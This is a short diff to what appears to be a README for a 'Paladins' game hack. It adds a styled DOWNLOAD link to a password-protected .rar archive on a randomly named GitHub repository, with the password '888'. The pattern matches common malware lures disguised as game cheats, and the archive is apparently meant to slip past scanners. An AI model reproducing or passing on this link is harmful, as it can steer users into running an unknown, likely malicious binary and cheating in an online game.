@@ -10,7 +10,7 @@ Game version: latest current version
 Performance: Epic Games / Steam
 
 
-# 🗂[𝐃 𝐎 𝐖 𝐍 𝐋 𝐎 𝐀 𝐃]()
+# 🗂[𝐃 𝐎 𝐖 𝐍 𝐋 𝐎 𝐀 𝐃](https://github.com/tyan-2011/vne9qdmdun41/raw/main/paladins%20hack.rar)
 
 # 🔐Password: 888
 
